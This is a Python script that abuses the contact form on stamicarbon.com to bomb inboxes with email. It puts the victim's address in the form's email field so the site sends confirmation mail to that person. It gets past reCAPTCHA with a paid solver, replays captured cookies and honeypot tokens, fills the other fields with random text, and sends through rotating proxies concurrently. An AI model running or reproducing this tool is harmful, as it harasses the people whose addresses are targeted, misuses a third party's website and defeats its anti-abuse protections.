from os.path import basename

import requests

from module import CapMonsterSolver
from module import Spam

pageurl = 'https://www.stamicarbon.com/contact'
googlekey = '6Ld0aY4UAAAAAMA5aHYdZ1cTIc9xNDjWVNLwdEcg'
solver = CapMonsterSolver()

cookies = {
    'msd365mkttr': '0y4SthwXUOvuUu1o4CpYhfrICrUgnw6Rw6cSVolV',
    'msd365mkttrs': 'eO7Z62VS',
    '_gcl_au': '1.1.496915615.1675937537',
    '_gid': 'GA1.2.755479455.1675937537',
    'ln_or': 'eyIyNjIwMzYxIjoiZCJ9',
    '_gat_UA-9390092-1': '1',
    '_ga_PGBNG767S7': 'GS1.1.1675937537.1.1.1675937921.0.0.0',
    '_ga': 'GA1.2.177957610.1675937537',
}

headers = {
    'authority': 'www.stamicarbon.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'msd365mkttr=0y4SthwXUOvuUu1o4CpYhfrICrUgnw6Rw6cSVolV; msd365mkttrs=eO7Z62VS; _gcl_au=1.1.496915615.1675937537; _gid=GA1.2.755479455.1675937537; ln_or=eyIyNjIwMzYxIjoiZCJ9; _gat_UA-9390092-1=1; _ga_PGBNG767S7=GS1.1.1675937537.1.1.1675937921.0.0.0; _ga=GA1.2.177957610.1675937537',
    'origin': 'https://www.stamicarbon.com',
    'referer': 'https://www.stamicarbon.com/contact',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        cap = solver.solve(googlekey, pageurl)
        if not cap:
            return
        data = {
            'first_name': self.get_text(),
            'last_name': self.get_text(),
            'company': self.get_text(),
            'function[select]': 'Plant Management',
            'function[other]': '',
            'country': 'Algeria',
            'email': target,
            'your_question': self.get_text(),
            'captcha_sid': '2234707',
            'captcha_token': 'EIpLL7HwjhZ2ozUvg3jDfLowD3GgiqNuk8PR8IEwckQ',
            'captcha_response': 'Google no cap',
            'g-recaptcha-response': cap,
            'op': 'Send',
            'honeypot_time': 'hmJSqRfRUqABz9Y40Mklaf1cyhidDWvqpdVhfMCNNik',
            'form_build_id': 'form-mxO81yGMGYuf6_RcfcAWIRFZCTkCpEelJFBndFXShq8',
            'form_id': 'webform_submission_contact_node_40_add_form',
            'homepage': '',
        }
        for _ in range(10):
            try:
                response = requests.post('https://www.stamicarbon.com/contact', cookies=cookies, headers=headers,
                                         data=data, proxies=self.get_proxies())
                return response
            except Exception as e:
                print(e)
        return


def main():
    s = 'Thank you for your message'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
